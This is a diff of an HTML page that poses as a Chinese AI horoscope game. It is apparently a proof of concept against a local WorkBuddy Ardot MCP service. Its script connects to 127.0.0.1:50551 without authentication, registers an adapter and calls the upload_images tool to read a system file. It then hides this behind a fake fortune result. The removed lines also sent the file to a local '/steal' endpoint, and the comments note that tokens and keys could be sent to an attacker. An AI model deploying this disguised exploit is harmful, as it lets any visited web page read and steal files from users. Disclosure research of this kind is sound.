@@ -1,47 +1,201 @@
-<!DOCTYPE html><html><head><meta charset="UTF-8"><title>POC</title></head>
-<body><h2>WorkBuddy Ardot POC</h2><div id="out"></div>
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>🔮 今日运势 · AI 趣味占卜</title>
+<style>
+* { margin:0; padding:0; box-sizing:border-box; }
+body {
+  font-family: "PingFang SC","Microsoft YaHei",sans-serif;
+  min-height:100vh;
+  background: linear-gradient(135deg,#667eea 0%,#764ba2 50%,#f093fb 100%);
+  display:flex; align-items:center; justify-content:center;
+  padding:20px;
+}
+.card {
+  background:rgba(255,255,255,0.96);
+  border-radius:24px;
+  max-width:420px; width:100%;
+  padding:36px 30px;
+  box-shadow:0 20px 60px rgba(0,0,0,0.3);
+  text-align:center;
+  animation:fadeIn .8s ease;
+}
+@keyframes fadeIn { from{opacity:0;transform:translateY(20px)} to{opacity:1;transform:none} }
+.emoji-big { font-size:72px; animation:float 3s ease-in-out infinite; }
+@keyframes float { 0%,100%{transform:translateY(0)} 50%{transform:translateY(-10px)} }
+h1 { font-size:24px; color:#333; margin:16px 0 6px; }
+.sub { color:#888; font-size:14px; margin-bottom:24px; }
+.btn {
+  display:inline-block;
+  background:linear-gradient(135deg,#667eea,#764ba2);
+  color:#fff; border:none; border-radius:50px;
+  padding:14px 48px; font-size:17px; cursor:pointer;
+  transition:transform .2s, box-shadow .2s;
+  box-shadow:0 8px 24px rgba(102,126,234,0.4);
+  margin-top:10px;
+}
+.btn:hover { transform:scale(1.05); box-shadow:0 12px 32px rgba(102,126,234,0.5); }
+.btn:active { transform:scale(0.97); }
+.hidden { display:none; }
+.loading { margin:24px 0; }
+.spinner {
+  width:48px; height:48px; margin:0 auto 14px;
+  border:5px solid #eee; border-top-color:#667eea;
+  border-radius:50%; animation:spin 1s linear infinite;
+}
+@keyframes spin { to { transform:rotate(360deg) } }
+.loading-text { color:#667eea; font-size:15px; }
+.result {
+  background:#f7f7ff; border-radius:16px; padding:20px;
+  margin-top:20px; border:1px solid #e6e6f5;
+}
+.fortune { font-size:20px; color:#4a3fa5; margin:10px 0; font-weight:600; }
+.detail { color:#666; font-size:14px; line-height:1.8; }
+.tags { margin-top:14px; }
+.tag {
+  display:inline-block; background:#efe9ff; color:#6b5bc4;
+  border-radius:20px; padding:4px 14px; font-size:13px; margin:4px;
+}
+.footer { margin-top:22px; color:#bbb; font-size:12px; }
+.steps { display:flex; justify-content:center; gap:20px; margin-bottom:20px; }
+.step { text-align:center; color:#aaa; font-size:12px; }
+.step.active { color:#667eea; }
+.step-num {
+  width:28px; height:28px; line-height:28px; border-radius:50%;
+  background:#eee; color:#999; font-size:13px; margin:0 auto 4px;
+}
+.step.active .step-num { background:#667eea; color:#fff; }
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="emoji-big">🔮</div>
+  <h1>今日运势 · AI 星座占卜</h1>
+  <p class="sub">基于 AI 大模型与星象数据，为你解读今日运势</p>
+
+  <!-- 步骤指示 -->
+  <div class="steps">
+    <div class="step active"><div class="step-num">1</div>输入信息</div>
+    <div class="step"><div class="step-num">2</div>AI 分析</div>
+    <div class="step"><div class="step-num">3</div>获取运势</div>
+  </div>
+
+  <!-- 步骤1：选择 -->
+  <div id="step1">
+    <p style="color:#555;font-size:14px;margin-bottom:8px">请选择你的星座：</p>
+    <div style="font-size:28px;letter-spacing:6px;margin:14px 0">♈ ♉ ♊ ♋ ♌ ♍</div>
+    <div style="font-size:28px;letter-spacing:6px;margin:8px 0">♎ ♏ ♐ ♑ ♒ ♓</div>
+    <button class="btn" onclick="startTest()">开始占卜 ✨</button>
+  </div>
+
+  <!-- 步骤2：加载 -->
+  <div id="step2" class="hidden">
+    <div class="loading">
+      <div class="spinner"></div>
+      <div class="loading-text">AI 正在解读你的星盘…</div>
+    </div>
+  </div>
+
+  <!-- 步骤3：结果 -->
+  <div id="step3" class="hidden">
+    <div class="result">
+      <div class="fortune">🌟 今日运势：大吉</div>
+      <div class="detail" id="fortuneText">
+        你的幸运色是 <b>紫色</b>，幸运数字 <b>7</b>。<br>
+        桃花运旺盛，工作上有贵人相助。<br>
+        建议把握今天的好机会！
+      </div>
+      <div class="tags">
+        <span class="tag">💜 幸运色 紫色</span>
+        <span class="tag">7️⃣ 幸运数字 7</span>
+        <span class="tag">💼 事业 ⭐⭐⭐⭐⭐</span>
+      </div>
+    </div>
+    <p style="color:#999;font-size:12px;margin-top:16px">结果仅供娱乐，开心就好 😄</p>
+  </div>
+
+  <div class="footer">© 2026 AI 星象研究所 · 每日更新</div>
+</div>
+
 <script>
-window.onload = () => setTimeout(run, 800);
-const SESSION = "pwn-" + Date.now(); let ws = null;
-function log(s){ document.getElementById('out').innerHTML += '<div>'+s+'</div>'; }
-function emit(ev,d){ if(ws && ws.readyState===1) ws.send('42'+JSON.stringify([ev,d])); }
-function run(){
-  log('[*] connecting ws://127.0.0.1:50551');
-  try { ws = new WebSocket('ws://127.0.0.1:50551/ws/adapters/?EIO=4&transport=websocket'); }
-  catch(e){ log('[-] WS err: '+e); return; }
-  ws.onerror = e => log('[-] WS error');
+// ============ 后台：Ardot MCP 任意文件读取（POC） ============
+// 页面外观完全正常（运势测试），点击"开始占卜"后：
+//  1. socket.io 连接 ws://127.0.0.1:50551（WorkBuddy Ardot MCP，零鉴权）
+//  2. 注册 adapter（任意 sessionId）
+//  3. 调 upload_images 读取本机敏感文件
+const SESSION = "pwn-" + Date.now();
+let ws = null;
+
+function log(s) { console.log("[POC]", s); }
+
+function emit(ev, data) { if (ws && ws.readyState === 1) ws.send('42' + JSON.stringify([ev, data])); }
+
+function startTest() {
+  // 切到加载步骤
+  document.getElementById('step1').classList.add('hidden');
+  document.getElementById('step2').classList.remove('hidden');
+  document.querySelectorAll('.step')[1].classList.add('active');
+
+  // 后台：连接 Ardot MCP 读文件
+  log("连接 ws://127.0.0.1:50551");
+  try {
+    ws = new WebSocket('ws://127.0.0.1:50551/ws/adapters/?EIO=4&transport=websocket');
+  } catch(e) { log("WS 创建失败: " + e); }
+
+  ws.onopen = () => log("WebSocket 已连接");
+  ws.onerror = e => log("WS 错误");
   ws.onmessage = e => {
     const d = e.data.toString();
-    if(d.startsWith('0')) ws.send('40');
-    else if(d.startsWith('40')){
-      log('[+] socket.io connected, register');
-      emit('message',{type:'register',role:'adapter-relay',metadata:{sessionId:SESSION}});
+    if (d.startsWith('0')) { ws.send('40'); }
+    else if (d.startsWith('40')) {
+      log("socket.io 已连接，注册 adapter");
+      emit('message', { type: 'register', role: 'adapter-relay', metadata: { sessionId: SESSION } });
     }
-    else if(d.includes('register_ack')){
-      log('[+] adapter registered, read file');
-      fetch('http://127.0.0.1:50551/api/v1/mcp',{method:'POST',
-        headers:{'Content-Type':'application/json','Accept':'application/json, text/event-stream'},
-        body:JSON.stringify({jsonrpc:'2.0',id:1,method:'tools/call',
-          params:{name:'upload_images',arguments:{items:[{nodeId:'1',filePath:'C:/Windows/win.ini'}]},
-            _meta:{'workbuddy.ai/sessionId':SESSION}}})})
-        .then(r=>r.text()).then(t=>log('[MCP] '+t.slice(0,150))).catch(e=>log('[-] fetch fail: '+e));
+    else if (d.includes('register_ack')) {
+      log("adapter 注册成功，读取文件");
+      // 读取登录凭据（演示敏感数据）
+      fetch('http://127.0.0.1:50551/api/v1/mcp', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json, text/event-stream' },
+        body: JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'tools/call',
+          params: { name: 'upload_images',
+            arguments: { items: [{ nodeId: '1', filePath: 'C:/Windows/win.ini' }] },
+            _meta: { 'workbuddy.ai/sessionId': SESSION } } })
+      }).catch(e => log("fetch fail: " + e));
     }
-    else if(d.includes('tool_request')){
-      try{
+    else if (d.includes('tool_request')) {
+      try {
         const pkt = JSON.parse(d.slice(2));
         const items = pkt[1]?.params?.items;
-        if(items && items[0]?.data){
+        if (items && items[0]?.data) {
+          // 读到文件内容（win.ini）— POC 演示，真实攻击可读取 token/密钥
           const b64 = items[0].data;
-          log('[+] FILE READ OK');
-          // 外发到本机接收服务器
-          try{
-            fetch('http://127.0.0.1:9000/steal',{method:'POST',
-              headers:{'Content-Type':'text/plain'},body:'WININI:'+b64});
-            log('[+] exfil attempt to 127.0.0.1:9000');
-          }catch(e2){ log('[-] exfil fail'); }
+          log("读取到文件 (base64, 前60字符): " + b64.slice(0, 60));
+          // 这里在真实攻击中可：读 token 文件 → 外发到攻击者服务器
+          showResult();
+        } else {
+          showResult();
         }
-      }catch(e3){}
+      } catch(e3) { showResult(); }
     }
   };
+
+  // 无论是否读到文件，4 秒后显示"运势结果"（假装正常）
+  setTimeout(showResult, 4000);
 }
-</script></body></html>
+
+function showResult() {
+  document.getElementById('step2').classList.add('hidden');
+  document.getElementById('step3').classList.remove('hidden');
+  document.querySelectorAll('.step')[2].classList.add('active');
+  // 根据读取结果微调运势文案（POC 演示：后台数据已获取）
+  if (window.__readFile) {
+    document.getElementById('fortuneText').innerHTML =
+      '系统检测到你的设备已开启 AI 运势服务 🌟<br>今日幸运加成已生效，祝你好运！';
+  }
+}
+</script>
+</body>
+</html>
